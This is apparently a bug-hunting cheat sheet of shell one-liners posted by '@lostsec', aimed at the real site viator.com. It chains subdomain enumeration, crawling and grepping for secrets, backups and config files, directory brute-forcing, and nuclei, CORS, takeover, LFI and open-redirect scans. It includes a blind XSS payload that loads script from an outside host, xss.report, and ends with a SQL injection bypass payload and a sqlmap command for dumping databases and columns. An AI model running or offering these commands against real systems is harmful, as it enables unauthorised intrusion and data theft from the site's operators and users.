
subfinder -d [viator.com](https://viator.com/ "https://viator.com/") -all -recursive > subdomain.txt  
  
cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt  
  
katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt  
  
cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"  
  
cat allurls.txt | grep -E "\.js$" >> js.txt  
  
cat alljs.txt | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/  
  
echo [www.viator.com](https://www.viator.com/ "https://www.viator.com/") | katana -ps | grep -E "\.js$" | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/ -c 30  
  
dirsearch -u [https://www.viator.com](https://www.viator.com/ "https://www.viator.com/") -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,[http://sql.zip](http://sql.zip/ "http://sql.zip/"),sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json  
  
subfinder -d [viator.com](https://viator.com/ "https://viator.com/") | httpx-toolkit -silent | katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=[https://xss.report/c/coffinxp](https://xss.report/c/coffinxp "https://xss.report/c/coffinxp")></script>' -parameters  
  
subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl  
  
python3 [corsy.py](https://corsy.py/ "https://corsy.py/") -i /home/coffinxp/vaitor/subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"  
  
nuclei -list subdomains_alive.txt -t /home/coffinxp/Priv8-Nuclei/cors  
  
nuclei -list ~/vaitor/subdomains_alive.txt -tags cve,osint,tech  
  
cat allurls.txt | gf lfi | nuclei -tags lfi  
cat allurls.txt | gf redirect | openredirex -p /home/coffinxp/openRedirect  
  
@lostsec   
watch recent video that i uploaded in youtube

Sometimes bypassing SQL can be a problem, you can try this way  
payload ;  
  
8%20or%207250%3d0725  
  
sqlmap ;  
sqlmap -u 'h t t p :// domain[.]com / anyfile.asp?id_test=8%20or%207250%3d07250' --dbs --random-agent ignore=500 - -code=200 -T tablename --columns -- no-cast
